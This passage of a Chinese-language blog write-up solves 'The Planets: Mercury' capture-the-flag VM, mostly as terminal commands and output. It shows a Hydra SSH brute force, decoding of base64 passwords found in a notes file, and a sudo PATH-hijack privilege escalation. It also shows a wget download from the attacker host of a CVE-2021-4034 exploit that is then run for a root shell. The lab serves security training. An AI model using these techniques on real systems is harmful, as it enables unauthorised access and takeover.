+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/THE_PLANETS_MERCURY]<br>└─$ <span class="hljs-built_in">cat</span> db                                <br>1-johnny1987-john<br>2-lovemykids111-laura<br>3-lovemybeer111-sam<br>4-mercuryisthesizeof0.056Earths-webmaster<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/THE_PLANETS_MERCURY]<br>└─$ <span class="hljs-built_in">cat</span> db | awk -F <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-string">&#x27;&#123;print$2&#125;&#x27;</span> &gt; passwd    <br><br>┌──(kali㉿kali)-[~/Downloads/THE_PLANETS_MERCURY]<br>└─$ <span class="hljs-built_in">cat</span> db | awk -F <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-string">&#x27;&#123;print$3&#125;&#x27;</span> &gt; user<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/THE_PLANETS_MERCURY]<br>└─$ hydra -L user -P passwd 192.168.56.115 ssh<br>Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-15 08:36:33<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task<br>[DATA] attacking ssh://192.168.56.115:22/<br>[22][ssh] host: 192.168.56.115   login: webmaster   password: mercuryisthesizeof0.056Earths<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-15 08:36:38<br></code></pre></td></tr></table></figure>
+
+<p>爆破得到用户名和密码，尝试 ssh 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/THE_PLANETS_MERCURY]<br>└─$ ssh webmaster@192.168.56.115    <br>webmaster@192.168.56.115\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> * Documentation:  https://help.ubuntu.com</span><br><span class="hljs-string"> * Management:     https://landscape.canonical.com</span><br><span class="hljs-string"> * Support:        https://ubuntu.com/advantage</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System information as of Thu 15 Jun 01:37:12 UTC 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">  System load:  0.01              Processes:               106</span><br><span class="hljs-string">  Usage of /:   78.3% of 4.86GB   Users logged in:         0</span><br><span class="hljs-string">  Memory usage: 31%               IPv4 address for enp0s3: 192.168.56.115</span><br><span class="hljs-string">  Swap usage:   0%</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">22 updates can be installed immediately.</span><br><span class="hljs-string">0 of these updates are security updates.</span><br><span class="hljs-string">To see these additional updates run: apt list --upgradable</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">The list of available updates is more than a week old.</span><br><span class="hljs-string">To check for new updates run: sudo apt update</span><br><span class="hljs-string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Last login: Tue Sep  1 13:57:14 2020 from 192.168.31.136</span><br><span class="hljs-string">webmaster@mercury:~$ whoami</span><br><span class="hljs-string">webmaster</span><br><span class="hljs-string">webmaster@mercury:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:d5:99:58 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.115/24 brd 192.168.56.255 scope global dynamic enp0s3</span><br><span class="hljs-string">       valid_lft 497sec preferred_lft 497sec</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fed5:9958/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">webmaster@mercury:~$ uname -a</span><br><span class="hljs-string">Linux mercury 5.4.0-45-generic #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">webmaster@mercury:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for webmaster: </span><br><span class="hljs-string">Sorry, user webmaster may not run sudo on mercury.</span><br><span class="hljs-string">webmaster@mercury:~$ ls</span><br><span class="hljs-string">mercury_proj  user_flag.txt</span><br><span class="hljs-string">webmaster@mercury:~$ cat user_flag.txt </span><br><span class="hljs-string">[user_flag_8339915c9a454657bd60ee58776f4ccd]</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">webmaster@mercury:~$ <span class="hljs-built_in">ls</span> -liah<br>total 36K<br> 35299 drwx------ 4 webmaster webmaster 4.0K Sep  2  2020 .<br>    18 drwxr-xr-x 5 root      root      4.0K Aug 28  2020 ..<br> 32650 lrwxrwxrwx 1 webmaster webmaster    9 Sep  1  2020 .bash_history -&gt; /dev/null<br> 35301 -rw-r--r-- 1 webmaster webmaster  220 Aug 27  2020 .bash_logout<br> 35300 -rw-r--r-- 1 webmaster webmaster 3.7K Aug 27  2020 .bashrc<br>165881 drwx------ 2 webmaster webmaster 4.0K Aug 27  2020 .cache<br>162261 drwxrwxr-x 5 webmaster webmaster 4.0K Aug 28  2020 mercury_proj<br> 35302 -rw-r--r-- 1 webmaster webmaster  807 Aug 27  2020 .profile<br>    22 -rw-rw-r-- 1 webmaster webmaster   75 Sep  1  2020 .selected_editor<br> 55367 -rw------- 1 webmaster webmaster   45 Sep  1  2020 user_flag.txt<br>webmaster@mercury:~$ <span class="hljs-built_in">cd</span> mercury_proj/<br>webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">ls</span> -liah<br>total 28K<br>162261 drwxrwxr-x 5 webmaster webmaster 4.0K Aug 28  2020 .<br> 35299 drwx------ 4 webmaster webmaster 4.0K Sep  2  2020 ..<br>165898 -rw-r--r-- 1 webmaster webmaster    0 Aug 27  2020 db.sqlite3<br>165900 -rwxr-xr-x 1 webmaster webmaster  668 Aug 27  2020 manage.py<br>165882 drwxrwxr-x 6 webmaster webmaster 4.0K Sep  1  2020 mercury_facts<br>165766 drwxrwxr-x 4 webmaster webmaster 4.0K Aug 28  2020 mercury_index<br>165765 drwxrwxr-x 3 webmaster webmaster 4.0K Aug 28  2020 mercury_proj<br>166251 -rw------- 1 webmaster webmaster  196 Aug 28  2020 notes.txt<br><br></code></pre></td></tr></table></figure>
+
+<p>进入到 mercury_proj 目录下看到有个 notes.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">cat</span> manage.py <br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;Django&#x27;s command-line utility for administrative tasks.&quot;</span><span class="hljs-string">&quot;&quot;</span><br>import os<br>import sys<br><br>def main():<br>    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;Run administrative tasks.&quot;</span><span class="hljs-string">&quot;&quot;</span><br>    os.environ.setdefault(<span class="hljs-string">&#x27;DJANGO_SETTINGS_MODULE&#x27;</span>, <span class="hljs-string">&#x27;mercury_proj.settings&#x27;</span>)<br>    try:<br>        from django.core.management import execute_from_command_line<br>    except ImportError as exc:<br>        raise ImportError(<br>            <span class="hljs-string">&quot;Couldn&#x27;t import Django. Are you sure it&#x27;s installed and &quot;</span><br>            <span class="hljs-string">&quot;available on your PYTHONPATH environment variable? Did you &quot;</span><br>            <span class="hljs-string">&quot;forget to activate a virtual environment?&quot;</span><br>        ) from exc<br>    execute_from_command_line(sys.argv)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br>webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">cat</span> notes.txt <br>Project accounts (both restricted):<br>webmaster <span class="hljs-keyword">for</span> web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK<br>linuxmaster <span class="hljs-keyword">for</span> linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==<br></code></pre></td></tr></table></figure>
+
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>txt 文件中包含两个用户名和对应的密码（应该是密码），base64 解码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">webmaster@mercury:~/mercury_proj$ <span class="hljs-built_in">cat</span> /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br>syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:110:1::/var/cache/pollinate:/bin/false<br>sshd:x:111:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>mercury:x:1000:1000:mercury:/home/mercury:/bin/bash<br>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br>mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false<br>webmaster:x:1001:1001:,,,:/home/webmaster:/bin/bash<br>linuxmaster:x:1002:1002:,,,:/home/linuxmaster:/bin/bash<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>mercurymeandiameteris4880km<br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>mercuryisthesizeof0.056Earths<br></code></pre></td></tr></table></figure>
+
+<p>顺便看一眼 passwd 文件，确认 linux_master 是个用户，切换用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">webmaster@mercury:~/mercury_proj$ su linuxmaster<br>Password: <br>linuxmaster@mercury:/home/webmaster/mercury_proj$ <span class="hljs-built_in">cd</span> ~<br>linuxmaster@mercury:~$ <span class="hljs-built_in">ls</span><br>linuxmaster@mercury:~$ <span class="hljs-built_in">ls</span> -liah<br>total 24K<br>162165 drwx------ 3 linuxmaster linuxmaster 4.0K Sep  2  2020 .<br>    18 drwxr-xr-x 5 root        root        4.0K Aug 28  2020 ..<br>165762 lrwxrwxrwx 1 linuxmaster linuxmaster    9 Sep  1  2020 .bash_history -&gt; /dev/null<br>165896 -rw-r--r-- 1 linuxmaster linuxmaster  220 Aug 28  2020 .bash_logout<br>162221 -rw-r--r-- 1 linuxmaster linuxmaster 3.7K Aug 28  2020 .bashrc<br>165920 drwx------ 2 linuxmaster linuxmaster 4.0K Aug 28  2020 .cache<br>166244 -rw-r--r-- 1 linuxmaster linuxmaster  807 Aug 28  2020 .profile<br></code></pre></td></tr></table></figure>
+
+<h3 id="环境变量与-sudoer-利用"><a href="#环境变量与-sudoer-利用" class="headerlink" title="环境变量与 sudoer 利用"></a>环境变量与 sudoer 利用</h3><p>sudo -l 发现用户有个可以用 root 直接运行的 sh 脚本，而脚本中调用了 tail 命令，这里刚开始没想到提权的方式，用 polkit 进行了提权，在红队笔记的视频中补充了这种提权方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/home$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> linuxmaster: <br>Matching Defaults entries <span class="hljs-keyword">for</span> linuxmaster on mercury:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User linuxmaster may run the following commands on mercury:<br>    (root : root) SETENV: /usr/bin/check_syslog.sh<br>linuxmaster@mercury:/home$ <span class="hljs-built_in">ls</span> -liah /usr/bin/check_syslog.sh<br>166272 -rwxr-xr-x 1 root root 39 Aug 28  2020 /usr/bin/check_syslog.sh<br>linuxmaster@mercury:/home$ <span class="hljs-built_in">cat</span> /usr/bin/check_syslog.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">tail</span> -n 10 /var/log/syslog<br>linuxmaster@mercury:/home$ /usr/bin/check_syslog.sh<br><span class="hljs-built_in">tail</span>: cannot open <span class="hljs-string">&#x27;/var/log/syslog&#x27;</span> <span class="hljs-keyword">for</span> reading: Permission denied<br>linuxmaster@mercury:/home$ sudo /usr/bin/check_syslog.sh<br>Jun 15 01:37:12 mercury systemd[4101]: Reached target Sockets.<br>Jun 15 01:37:12 mercury systemd[4101]: Reached target Basic System.<br>Jun 15 01:37:12 mercury systemd[1]: Started User Manager <span class="hljs-keyword">for</span> UID 1001.<br>Jun 15 01:37:12 mercury systemd[1]: Started Session 13 of user webmaster.<br>Jun 15 01:37:12 mercury systemd[4101]: Reached target Main User Target.<br>Jun 15 01:37:12 mercury systemd[4101]: Startup finished <span class="hljs-keyword">in</span> 73ms.<br>Jun 15 01:40:32 mercury systemd-networkd[343]: enp0s3: DHCP: No gateway received from DHCP server.<br>Jun 15 01:40:32 mercury systemd-timesyncd[469]: Network configuration changed, trying to establish connection.<br>Jun 15 01:45:31 mercury systemd-networkd[343]: enp0s3: DHCP: No gateway received from DHCP server.<br>Jun 15 01:45:31 mercury systemd-timesyncd[469]: Network configuration changed, trying to establish connection.<br>linuxmaster@mercury:/home$ <span class="hljs-built_in">id</span><br>uid=1002(linuxmaster) gid=1002(linuxmaster) <span class="hljs-built_in">groups</span>=1002(linuxmaster),1003(viewsyslog)<br><br></code></pre></td></tr></table></figure>
+
+<p>既然调用了 tail 命令，我们可以利用环境变量和软链接，将 tail 指向 vi，然后按照 <code>sudo -l</code> 中的要求给定环境变量，去执行 sh 脚本，最后利用 vi 中 <code>:!bash</code> 新开启一个交互 shell 即可实现提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:~$ <span class="hljs-built_in">ln</span> -s /bin/vi <span class="hljs-built_in">tail</span><br>linuxmaster@mercury:~$ <span class="hljs-built_in">ls</span> -liah<br>total 24K<br>162165 drwx------ 3 linuxmaster linuxmaster 4.0K Jun 15 07:39 .<br>    18 drwxr-xr-x 5 root        root        4.0K Aug 28  2020 ..<br>165762 lrwxrwxrwx 1 linuxmaster linuxmaster    9 Sep  1  2020 .bash_history -&gt; /dev/null<br>165896 -rw-r--r-- 1 linuxmaster linuxmaster  220 Aug 28  2020 .bash_logout<br>162221 -rw-r--r-- 1 linuxmaster linuxmaster 3.7K Aug 28  2020 .bashrc<br>165920 drwx------ 2 linuxmaster linuxmaster 4.0K Aug 28  2020 .cache<br>166244 -rw-r--r-- 1 linuxmaster linuxmaster  807 Aug 28  2020 .profile<br>162271 lrwxrwxrwx 1 linuxmaster linuxmaster    7 Jun 15 07:39 <span class="hljs-built_in">tail</span> -&gt; /bin/vi<br>linuxmaster@mercury:~$ <span class="hljs-built_in">export</span> PATH=.:<span class="hljs-variable">$PATH</span><br>linuxmaster@mercury:~$ <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><br>.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games<br>linuxmaster@mercury:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh <br>[sudo] password <span class="hljs-keyword">for</span> linuxmaster: <br>2 files to edit<br><br>root@mercury:/home/linuxmaster<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/home$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>     1098    164 -rwsr-xr-x   1 root     root       166056 Feb  3  2020 /usr/bin/sudo<br>      694     88 -rwsr-xr-x   1 root     root        88464 May 28  2020 /usr/bin/gpasswd<br>     1097     68 -rwsr-xr-x   1 root     root        67816 Apr  2  2020 /usr/bin/su<br>      571     52 -rwsr-xr-x   1 root     root        53040 May 28  2020 /usr/bin/chsh<br>      842     44 -rwsr-xr-x   1 root     root        44784 May 28  2020 /usr/bin/newgrp<br>      828     56 -rwsr-xr-x   1 root     root        55528 Apr  2  2020 /usr/bin/mount<br>      565     84 -rwsr-xr-x   1 root     root        85064 May 28  2020 /usr/bin/chfn<br>      497     56 -rwsr-sr-x   1 daemon   daemon      55560 Nov 12  2018 /usr/bin/at<br>      896     32 -rwsr-xr-x   1 root     root        31032 Aug 16  2019 /usr/bin/pkexec<br>     1167     40 -rwsr-xr-x   1 root     root        39144 Apr  2  2020 /usr/bin/umount<br>      676     40 -rwsr-xr-x   1 root     root        39144 Mar  7  2020 /usr/bin/fusermount<br>      875     68 -rwsr-xr-x   1 root     root        68208 May 28  2020 /usr/bin/passwd<br>     1381     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device<br>     1374     52 -rwsr-xr--   1 root     messagebus    51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>     1586    464 -rwsr-xr-x   1 root     root         473576 May 29  2020 /usr/lib/openssh/ssh-keysign<br>     1596     24 -rwsr-xr-x   1 root     root          22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1<br></code></pre></td></tr></table></figure>
+
+<h3 id="Linux-Polkit-权限提升漏洞CVE-2021-4034"><a href="#Linux-Polkit-权限提升漏洞CVE-2021-4034" class="headerlink" title="Linux Polkit 权限提升漏洞CVE-2021-4034"></a>Linux Polkit 权限提升漏洞CVE-2021-4034</h3><p>看到 policykit-agent-helper-1 和 pkexec，可以尝试 <code>CVE-2021-4034</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">linuxmaster@mercury:/tmp$ wget http://192.168.56.106:8088/exploit<br>--2023-06-15 02:11:03--  http://192.168.56.106:8088/exploit<br>Connecting to 192.168.56.106:8088... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 4442423 (4.2M) [application/octet-stream]<br>Saving to: ‘exploit’<br><br>exploit                      100%[==============================================&gt;]   4.24M  --.-KB/s    <span class="hljs-keyword">in</span> 0.04s   <br><br>2023-06-15 02:11:03 (118 MB/s) - ‘exploit’ saved [4442423/4442423]<br><br>linuxmaster@mercury:/tmp$ <span class="hljs-built_in">ls</span><br>exploit<br>systemd-private-45c1fa3565004439b6a6c8b9e9d5799b-systemd-logind.service-wwncgi<br>systemd-private-45c1fa3565004439b6a6c8b9e9d5799b-systemd-resolved.service-4UEN1e<br>systemd-private-45c1fa3565004439b6a6c8b9e9d5799b-systemd-timesyncd.service-yQdfjg<br>linuxmaster@mercury:/tmp$ <span class="hljs-built_in">chmod</span> +x exploit <br>linuxmaster@mercury:/tmp$ ./exploit <br>2023/06/15 02:11:17 CMDTOEXECUTE is empty fallback to default value<br>2023/06/15 02:11:17 Executing <span class="hljs-built_in">command</span> sh<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1002(linuxmaster),1003(viewsyslog)<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># cd /root</span><br><span class="hljs-comment"># ls</span><br>root_flag.txt<br><span class="hljs-comment"># cat root_flag.txt</span><br>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@<br>@@@@@@@@@@@@@@@@@@@/<span 